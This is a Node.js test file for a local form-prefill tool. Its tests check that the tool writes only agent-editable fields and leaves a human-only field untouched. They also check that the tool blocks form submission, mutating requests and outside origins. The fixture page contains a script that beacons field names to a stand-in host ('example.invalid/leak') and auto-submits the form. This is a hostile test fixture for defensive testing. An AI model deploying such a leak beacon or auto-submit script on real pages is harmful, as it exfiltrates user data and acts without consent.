import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import { formSchemaFingerprint } from '../src/fingerprint.mjs';
import { prefillLocalForm } from '../src/prefill.mjs';


function fixtureHtml() {
  return `<!doctype html>
<html>
<head><title>UEX Prefill Fixture</title></head>
<body>
  <form id="application" method="post" action="/submit?server_token=DO-NOT-EXPORT">
    <label for="email">Email address</label>
    <input id="email" name="email" type="email" required>

    <label for="motivation">Motivation</label>
    <textarea id="motivation" name="motivation" maxlength="250" required></textarea>

    <label for="country">Country</label>
    <select id="country" name="country" required>
      <option>Spain</option><option>Portugal</option>
    </select>

    <fieldset>
      <legend>Preferred role</legend>
      <label><input type="radio" name="role" value="participant" required>Participant</label>
      <label><input type="radio" name="role" value="leader">Group leader</label>
    </fieldset>

    <fieldset>
      <legend>Skills</legend>
      <label><input type="checkbox" name="skills" value="video">Video</label>
      <label><input type="checkbox" name="skills" value="photo">Photography</label>
    </fieldset>

    <label for="availability">Availability declaration</label>
    <input id="availability" name="availability" type="text" value="HUMAN-MUST-STAY-UNTOUCHED" required>

    <button type="submit">Send application</button>
  </form>
  <script>
    const editable = new Set(['email','motivation','country','role','skills']);
    document.addEventListener('input', (event) => {
      const key = event.target?.name || event.target?.id;
      if (key === 'availability') fetch('/protected-touched');
      if (editable.has(key)) {
        fetch('/write-observed?field=' + encodeURIComponent(key));
        fetch('/autosave', {method: 'POST', body: String(event.target?.value || '')}).catch(() => {});
        fetch('https://example.invalid/leak?field=' + encodeURIComponent(key), {method: 'GET'}).catch(() => {});
      }
    }, true);
    queueMicrotask(() => {
      try { document.getElementById('application').requestSubmit(); } catch (_) {}
    });
  </script>
</body>
</html>`;
}


async function startFixtureServer() {
  let mutatingRequests = 0;
  let protectedTouches = 0;
  const observedWrites = new Set();
  const server = http.createServer((request, response) => {
    if (!['GET', 'HEAD', 'OPTIONS'].includes(request.method)) mutatingRequests += 1;
    if (request.url?.startsWith('/protected-touched')) protectedTouches += 1;
    if (request.url?.startsWith('/write-observed')) {
      const url = new URL(request.url, 'http://127.0.0.1');
      observedWrites.add(url.searchParams.get('field'));
    }
    if (request.url?.startsWith('/fixture')) {
      response.writeHead(200, {'content-type': 'text/html; charset=utf-8'});
      response.end(fixtureHtml());
      return;
    }
    response.writeHead(204);
    response.end();
  });
  await new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(0, '127.0.0.1', resolve);
  });
  const address = server.address();
  if (!address || typeof address === 'string') throw new Error('fixture server did not expose a TCP port');
  return {
    server,
    origin: `http://127.0.0.1:${address.port}`,
    mutationCount: () => mutatingRequests,
    protectedTouchCount: () => protectedTouches,
    observedWrites: () => new Set(observedWrites),
  };
}

function structuralFields() {
  return [
    {field_key:'email', label:'Email address', field_type:'email', required:true, options:[], maxlength:null},
    {field_key:'motivation', label:'Motivation', field_type:'textarea', required:true, options:[], maxlength:250},
    {field_key:'country', label:'Country', field_type:'select', required:true, options:['Spain','Portugal'], maxlength:null},
    {field_key:'role', label:'Participant', field_type:'radio', required:true, options:['Participant','Group leader'], maxlength:null},
    {field_key:'skills', label:'Video', field_type:'checkbox', required:false, options:['Video','Photography'], maxlength:null},
    {field_key:'availability', label:'Availability declaration', field_type:'text', required:true, options:[], maxlength:null},
  ];
}

function compiledPlan(url) {
  const common = structuralFields();
  const owned = [
    {...common[0], answer:'candidate@example.com', answer_source:'profile:email', evidence_ids:['ev-email'], ownership:'green_agent_factual', sensitivity:'private', editable_by_agent:true},
    {...common[1], answer:'A personal motivation draft', answer_source:'answer-pack:v1', evidence_ids:['ev-motivation'], ownership:'yellow_agent_assisted_human_review', sensitivity:'private', editable_by_agent:true},
    {...common[2], answer:'Spain', answer_source:'profile:country', evidence_ids:['ev-country'], ownership:'green_agent_factual', sensitivity:'public', editable_by_agent:true},
    {...common[3], answer:'Participant', answer_source:'application:role', evidence_ids:['ev-role'], ownership:'green_agent_factual', sensitivity:'private', editable_by_agent:true},
    {...common[4], answer:['Video','Photography'], answer_source:'profile:skills', evidence_ids:['ev-skills'], ownership:'yellow_agent_assisted_human_review', sensitivity:'private', editable_by_agent:true},
    {...common[5], answer:'HUMAN-MUST-STAY-UNTOUCHED', answer_source:'human:availability', evidence_ids:[], ownership:'red_human_confirmation', sensitivity:'private', editable_by_agent:false},
  ];
  return {
    plan_id:'plan-local-prefill', application_id:'app-local', opportunity_id:'opp-local',
    canonical_form_url:url, provider:'generic_html',
    form_fingerprint:formSchemaFingerprint({provider:'generic_html', canonicalFormUrl:url, fields:common}),
    fields:owned, ai_policy:'ai_assist_only', auth_requirement:'none', submit_authority:'human_only',
    allowed_origins:[new URL(url).origin], created_at:new Date(Date.now()-1000).toISOString(),
    expires_at:new Date(Date.now()+60_000).toISOString(), source_version:'fixture-v1', attachments:[], state:'prefill_ready',
  };
}


test('live prefill writes only agent-editable fields and blocks all side effects', { timeout: 60_000 }, async () => {
  const fixture = await startFixtureServer();
  const profileDir = fs.mkdtempSync(path.join(os.tmpdir(), 'uex-prefill-smoke-'));
  try {
    const url = `${fixture.origin}/fixture?session=LOCAL-PLAN`;
    const plan = compiledPlan(url);
    const result = await prefillLocalForm({ plan, profileDir, headless:true, channel:'chromium', timeoutMs:20_000 });

    assert.equal(result.mode, 'PREFILL_LOCAL_ONLY');
    assert.deepEqual(new Set(result.written_field_keys), new Set(['email','motivation','country','role','skills']));
    assert.deepEqual(result.protected_field_keys, ['availability']);
    assert.deepEqual(result.invalid_field_keys, []);
    assert.equal(result.write_count, 5);
    assert.equal(fixture.mutationCount(), 0, 'mutating request reached fixture server');
    assert.equal(fixture.protectedTouchCount(), 0, 'RED protected field emitted an input event');
    assert.deepEqual(fixture.observedWrites(), new Set(['email','motivation','country','role','skills']));

    const serialized = JSON.stringify(result);
    for (const secret of ['candidate@example.com','A personal motivation draft','HUMAN-MUST-STAY-UNTOUCHED','DO-NOT-EXPORT','LOCAL-PLAN']) {
      assert.equal(serialized.includes(secret), false, `prefill output leaked a value: ${secret}`);
    }
    assert.deepEqual(result.safety, {
      external_origins_allowed:false,
      same_origin_requests_only:true,
      submit_blocked:true,
      mutating_http_methods_blocked:true,
      cookies_read:false,
      storage_state_exported:false,
      protected_values_exported:false,
      answer_values_exported:false,
    });
  } finally {
    await new Promise((resolve) => fixture.server.close(resolve));
    fs.rmSync(profileDir, {recursive:true, force:true});
  }
});


test('fingerprint mismatch blocks all writes before prefill', { timeout: 60_000 }, async () => {
  const fixture = await startFixtureServer();
  const profileDir = fs.mkdtempSync(path.join(os.tmpdir(), 'uex-prefill-fingerprint-'));
  try {
    const plan = compiledPlan(`${fixture.origin}/fixture`);
    plan.form_fingerprint = 'sha256:stale-form';
    await assert.rejects(
      () => prefillLocalForm({plan, profileDir, headless:true, channel:'chromium'}),
      /FORM_FINGERPRINT_MISMATCH/,
    );
    assert.equal(fixture.observedWrites().size, 0);
    assert.equal(fixture.mutationCount(), 0);
  } finally {
    await new Promise((resolve) => fixture.server.close(resolve));
    fs.rmSync(profileDir, {recursive:true, force:true});
  }
});
